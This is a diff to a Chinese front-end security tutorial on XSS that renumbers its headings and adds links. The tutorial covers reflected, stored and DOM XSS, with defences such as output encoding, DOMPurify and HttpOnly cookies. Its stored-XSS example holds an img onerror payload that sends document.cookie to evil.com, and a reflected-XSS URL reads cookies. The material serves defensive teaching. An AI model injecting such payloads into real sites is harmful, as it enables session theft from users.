@@ -1,10 +1,9 @@
-<!--
-module:
+<!--module:
   parent: front-end
-  slug: front-end/xss
+  slug: 09.front-end/07-security/xss
   type: article
   category: 主模块子文章
-  summary: XSS 攻击与防御
+  summary: XSS（Cross-Site Scripting，为避免与 CSS 混淆缩写为 XSS）是 OWASP Top 10 常年位居前列的攻击方式。核心思路只有...
 -->
 
 # XSS（跨站脚本攻击）
@@ -22,8 +21,7 @@ XSS（跨站脚本攻击） 的关键不是'防住'——是**出事后 5 分钟
 
 ---
 
-## 1. XSS 的三类形态
-
+## XSS 的三类形态
 ```mermaid
 graph TB
   A[XSS 三类] --> B[反射型 XSS<br/>Reflected]
@@ -46,8 +44,7 @@ graph TB
 
 ---
 
-## 2. 反射型 XSS 详解
-
+## 反射型 XSS 详解
 ### 攻击流程
 1. 攻击者构造恶意 URL：`https://example.com/search?q=<script>alert(document.cookie)</script>`
 2. 诱导用户点击（邮件、聊天、钓鱼）
@@ -76,8 +73,7 @@ app.get('/search', (req, res) => {
 
 ---
 
-## 3. 存储型 XSS 详解
-
+## 存储型 XSS 详解
 ### 攻击流程
 1. 攻击者在论坛发帖：`<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`
 2. 帖子保存到数据库
@@ -94,8 +90,7 @@ app.get('/search', (req, res) => {
 
 ---
 
-## 4. DOM 型 XSS 详解
-
+## DOM 型 XSS 详解
 ### 攻击流程
 1. 前端 JS 读取 URL 数据：`const data = location.hash.slice(1)`
 2. 把数据写入 DOM：`document.getElementById('output').innerHTML = data`
@@ -128,8 +123,7 @@ function renderWelcome() {
 
 ---
 
-## 5. 防御体系
-
+## 防御体系
 ### 5.1 输入校验（Input Validation）
 
 **白名单优先于黑名单**：
@@ -193,8 +187,7 @@ Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax
 
 ---
 
-## 6. 富文本场景的安全处理
-
+## 富文本场景的安全处理
 当业务必须渲染 HTML（博客、富文本评论、Markdown）时：
 
 ```javascript
@@ -217,8 +210,7 @@ element.innerHTML = cleanHtml
 
 ---
 
-## 7. React / Vue 生态的 XSS 陷阱
-
+## React / Vue 生态的 XSS 陷阱
 | 框架 | 陷阱 | 安全做法 |
 |------|------|---------|
 | **React** | `dangerouslySetInnerHTML` | 必须搭配 DOMPurify |
@@ -230,8 +222,7 @@ element.innerHTML = cleanHtml
 
 ---
 
-## 8. XSS 与 CSRF 的关系
-
+## XSS 与 CSRF 的关系
 | 维度 | XSS | CSRF |
 |------|-----|------|
 | 攻击目标 | 用户（窃取数据） | 服务端（冒名操作） |
@@ -243,8 +234,7 @@ element.innerHTML = cleanHtml
 
 ---
 
-## 9. 测试与审计
-
+## 测试与审计
 | 工具 | 类型 | 适用 |
 |------|------|------|
 | **OWASP ZAP** | 自动化扫描 | 集成 CI |
@@ -254,8 +244,7 @@ element.innerHTML = cleanHtml
 
 ---
 
-## 10. 实战检查清单
-
+## 实战检查清单
 - [ ] 所有用户输入在输出时**必须编码**
 - [ ] 使用框架默认转义（React `{}` / Vue `{{ }}`），避免 `dangerouslySetInnerHTML` / `v-html`
 - [ ] 富文本必须用 DOMPurify 消毒
@@ -268,8 +257,7 @@ element.innerHTML = cleanHtml
 
 ---
 
-## 11. 交叉引用
-
+## 交叉引用
 - [`07-security/csp/`](../csp/) — CSP：XSS 的最后一道防线
 - [`07-security/csrf/`](../csrf/) — CSRF：另一种客户端攻击
 - [`07-security/sessions/`](../sessions/) — HttpOnly Cookie 保护会话
@@ -277,11 +265,17 @@ element.innerHTML = cleanHtml
 
 ---
 
-## 12. 与其他模块的关系
-
+## 与其他模块的关系
 - **上游**：[`07-security/`](../)（安全总览）、[`03-frameworks/`](../../03-frameworks/)（框架默认转义）
 - **下游**：被所有应用层复用（任何接收用户输入的地方）
 
 ---
+
+
+## 相关章节
+
+- [小程序开发](../../08-cross-platform/mini-program/README.md)
+- [06 性能](../../06-performance/README.md)
+- [状态管理](../../05-architecture/state-management/README.md)
 
 ← [返回 前端安全](../README.md)
